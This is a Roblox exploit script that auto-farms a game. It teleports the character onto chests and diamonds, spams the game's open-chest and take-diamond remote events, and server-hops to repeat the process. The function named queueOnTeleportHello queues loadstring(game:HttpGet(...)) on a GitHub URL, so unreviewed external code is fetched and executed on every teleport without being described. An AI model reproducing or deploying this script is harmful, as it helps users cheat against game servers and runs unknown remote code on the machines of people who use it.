-- LocalScript: Chest opener (hover) + Exact Diamond priority + Server hop using remotes

-- =============== Settings ===============
local CHEST_KEYWORD = "chest"           -- model names containing "chest" (case-insensitive)
local DIAMOND_NAME = "Diamond"          -- exact name match for diamonds
local Y_OFFSET = 10                     -- hover height
local HOVER_CHEST_TIME = 1              -- seconds to hover above each chest
local ITEMS_CONTAINER = workspace:WaitForChild("Items", 5) or workspace
local CHEST_OPEN_INTERVAL = 0.25        -- how often to fire the open-chest remote while hovering
local DIAMOND_TAKE_INTERVAL = 0.2       -- how often to fire the take-diamond remote / click while farming
local SEARCH_DIAMOND_DEEP = false       -- set to true if Diamonds can be nested deeper than Items' direct children
-- =======================================

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

   
    

-- Remotes
local RemoteEvents = ReplicatedStorage:WaitForChild("RemoteEvents")
local OpenChestRE = RemoteEvents:WaitForChild("RequestOpenItemChest")
local TakeDiamondRE = RemoteEvents:WaitForChild("RequestTakeDiamonds")

-- -------------- Utils --------------
local function containsIgnoreCase(str, sub)
    if type(str) ~= "string" or type(sub) ~= "string" then return false end
    return string.find(string.lower(str), string.lower(sub), 1, true) ~= nil
end

local function getCharacter()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    character:WaitForChild("HumanoidRootPart", 10)
    character:WaitForChild("Humanoid", 10)
    return character
end

local function getHumanoid()
    local char = getCharacter()
    return char and char:FindFirstChildOfClass("Humanoid") or nil
end

local function getTargetCFrame(inst)
    if not inst then return nil end
    if inst:IsA("Model") then
        local ok, cf = pcall(function() return inst:GetPivot() end)
        if ok and cf then return cf end
        local part = inst:FindFirstChildWhichIsA("BasePart", true)
        return part and part.CFrame or nil
    elseif inst:IsA("BasePart") then
        return inst.CFrame
    else
        local part = inst:FindFirstChildWhichIsA("BasePart", true)
        return part and part.CFrame or nil
    end
end

local function findClickDetector(container)
    if not container then return nil end
    if container:IsA("ClickDetector") then return container end
    if container:IsA("BasePart") then
        local cd = container:FindFirstChildWhichIsA("ClickDetector")
        if cd then return cd end
    end
    for _, d in ipairs(container:GetDescendants()) do
        if d:IsA("ClickDetector") then
            return d
        end
    end
    return nil
end

local function hoverTeleport(inst, durationSeconds, action, actionInterval)
    local character = getCharacter()
    if not character or not inst then return end

    local endTime = durationSeconds and (tick() + durationSeconds) or math.huge
    local lastActionTime = 0

    while tick() < endTime do
        if not inst:IsDescendantOf(workspace) then break end

        local targetCF = getTargetCFrame(inst)
        if not targetCF then break end

        character:PivotTo(targetCF + Vector3.new(0, Y_OFFSET, 0))

        if action and actionInterval then
            local now = tick()
            if now - lastActionTime >= actionInterval then
                pcall(action)
                lastActionTime = now
            end
        end

        RunService.Heartbeat:Wait()
    end
end

-- -------------- Remotes --------------
local function openChestRemote(chestModel)
    pcall(function()
        OpenChestRE:FireServer(chestModel)
    end)
end

local function takeDiamondRemote(diamondInst)
    pcall(function()
        TakeDiamondRE:FireServer(diamondInst)
    end)
end



-- -------------- Finders --------------
local function getNextChest(processedMap)
    if not ITEMS_CONTAINER or not ITEMS_CONTAINER.Parent then return nil end
    for _, inst in ipairs(ITEMS_CONTAINER:GetChildren()) do
        if inst:IsA("Model") and containsIgnoreCase(inst.Name, CHEST_KEYWORD) then
            if not processedMap[inst] then
                return inst
            end
        end
    end
    return nil
end

local function findDiamondExact()
    if not ITEMS_CONTAINER or not ITEMS_CONTAINER.Parent then return nil end

    if SEARCH_DIAMOND_DEEP then
        for _, inst in ipairs(ITEMS_CONTAINER:GetDescendants()) do
            if inst.Name == DIAMOND_NAME then
                return inst
            end
        end
    else
        for _, inst in ipairs(ITEMS_CONTAINER:GetChildren()) do
            if inst.Name == DIAMOND_NAME then
                return inst
            end
        end
    end

    return nil
end

-- -------------- Actions --------------
local function visitChestWithHoverAndOpen(chest)
    if not chest or not chest:IsDescendantOf(workspace) then return false end
    hoverTeleport(chest, HOVER_CHEST_TIME, function()
        openChestRemote(chest)
    end, CHEST_OPEN_INTERVAL)
    return true
end

local function farmDiamondUntilGone(diamondInst)
    if not diamondInst or not diamondInst:IsDescendantOf(workspace) then return end

    -- Keep hovering and taking the diamond until it disappears
    while diamondInst and diamondInst:IsDescendantOf(workspace) do
        hoverTeleport(diamondInst, 0.2, function()
            takeDiamondRemote(diamondInst)

        end, DIAMOND_TAKE_INTERVAL)
        task.wait() -- yield a bit between short hovers
    end
end

-- -------------- Server Hop --------------
local function findDifferentPublicServerId(placeId)
    local currentJobId = game.JobId
    local cursor = nil

    for _ = 1, 10 do
        local url = string.format(
            "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100%s",
            placeId,
            cursor and ("&cursor=" .. HttpService:UrlEncode(cursor)) or ""
        )

        local ok, body = pcall(function()
            return HttpService:GetAsync(url, true)
        end)
        if not ok then break end

        local ok2, data = pcall(function()
            return HttpService:JSONDecode(body)
        end)
        if not ok2 or not data or not data.data then break end

        for _, server in ipairs(data.data) do
            if server and server.id ~= currentJobId and (server.playing or 0) < (server.maxPlayers or 0) then
                return server.id
            end
        end

        cursor = data.nextPageCursor
        if not cursor then break end
    end

    return nil
end

local function queueOnTeleportHello()
    
        local suc, err = pcall(function()
               queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/t3rm1n4tor/KATANAAA.WTF/main/h',true))();")
        end)
        if suc then
        warn("executed autoinject")
       elseif err then
       error(tostring(err))
       end
    
end

-- Drop-in replacement for serverHop() to avoid rejoining same server

-- Safer server hop: prefers different servers, but always teleports (has fallback)
local function serverHop()
    local Players = game:GetService("Players")
    local TeleportService = game:GetService("TeleportService")
    local HttpService = game:GetService("HttpService")
    local LocalPlayer = Players.LocalPlayer
    local placeId = game.PlaceId
    local currentJobId = game.JobId

    -- Keep your queued message
    queueOnTeleportHello()

    -- Build visited set from TeleportData (so we try to avoid recent servers)
    local tpIn = TeleportService:GetLocalPlayerTeleportData()
    local visitedSet, visitedList = {}, {}
    if tpIn and tpIn.VisitedServerIds then
        for _, id in ipairs(tpIn.VisitedServerIds) do
            visitedSet[id] = true
            table.insert(visitedList, id)
        end
    end
    visitedSet[currentJobId] = true

    local function pickServerId()
        local function fetchPage(cursor, sortOrder)
            local url = string.format(
                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&limit=100%s",
                placeId,
                sortOrder or "Asc",
                cursor and ("&cursor=" .. HttpService:UrlEncode(cursor)) or ""
            )
            local ok, body = pcall(HttpService.GetAsync, HttpService, url, true)
            if not ok then return nil end
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, body)
            if not ok2 then return nil end
            return data
        end

        for _, order in ipairs({"Asc", "Desc"}) do
            local cursor = nil
            for _ = 1, 15 do
                local data = fetchPage(cursor, order)
                if not (data and data.data) then
                    return nil -- Http disabled/blocked or bad response
                end

                local candidates = {}
                for _, s in ipairs(data.data) do
                    local id = s and s.id
                    local playing = tonumber(s.playing) or 0
                    local maxPlayers = tonumber(s.maxPlayers) or 0
                    if id and not visitedSet[id] and maxPlayers > 0 and playing < maxPlayers then
                        table.insert(candidates, id)
                    end
                end

                if #candidates > 0 then
                    local rng = Random.new(os.clock())
                    return candidates[rng:NextInteger(1, #candidates)]
                end

                cursor = data.nextPageCursor
                if not cursor then break end
                task.wait(0.05)
            end
        end
        return nil
    end

    -- Prepare TeleportData to persist visited list
    local tpOut = tpIn or {}
    tpOut.VisitedServerIds = visitedList
    table.insert(tpOut.VisitedServerIds, currentJobId)
    while #tpOut.VisitedServerIds > 100 do
        table.remove(tpOut.VisitedServerIds, 1)
    end

    -- Try pick a specific different server; if not possible, fallback to random teleport
    local targetId = pickServerId()

    -- Retry on TeleportInitFailed by falling back to random teleport
    local initFailedConn
    initFailedConn = TeleportService.TeleportInitFailed:Connect(function(player)
        if player == LocalPlayer then
            pcall(function()
                TeleportService:Teleport(placeId, LocalPlayer, tpOut)
            end)
        end
    end)

    local ok = false
    if targetId then
        ok = pcall(function()
            TeleportService:TeleportToPlaceInstance(placeId, targetId, LocalPlayer, tpOut)
        end)
    end
    if not ok then
        pcall(function()
            TeleportService:Teleport(placeId, LocalPlayer, tpOut)
        end)
    end

    task.delay(10, function()
        if initFailedConn then initFailedConn:Disconnect() end
    end)
end

-- -------------- Coordinator --------------
local state = {
    processedChests = {},
    pauseForDiamond = false,
    serverHopStarted = false,
}

-- Initial humanoid health check → hop if 0
  while wait(0.5) do  
local ss = game.Players.LocalPlayer:GetAttribute("HasDied")
    if ss then
        state.serverHopStarted = true
        serverHop()
    print("hop")
        break
    elseif( game.Players.LocalPlayer.Character ~= nil and ss == nil) then
    warn("alive")
break
    end
end
-- Diamond watcher: exact name "Diamond" only
task.spawn(function()
    while not state.serverHopStarted do
        if not state.pauseForDiamond then
            local diamond = findDiamondExact()
            if diamond and diamond:IsDescendantOf(workspace) then
                state.pauseForDiamond = true
                pcall(function()
                    farmDiamondUntilGone(diamond)
                end)
                state.pauseForDiamond = false
            end
        end
        task.wait(0.2)
    end
end)

-- Chest runner: hover for 1s per chest (looped TP), opening via remote
task.spawn(function()
    task.wait(0.5) -- small startup delay

    while true do
        while state.pauseForDiamond do
            RunService.Heartbeat:Wait()
        end

        local chest = getNextChest(state.processedChests)
        if not chest then
            break
        end

        local ok = pcall(function()
            visitChestWithHoverAndOpen(chest)
        end)
        if ok then
            state.processedChests[chest] = true
        end

        task.wait(0.1)
    end

    -- All chests done → hop
    state.serverHopStarted = true
    serverHop()
end)
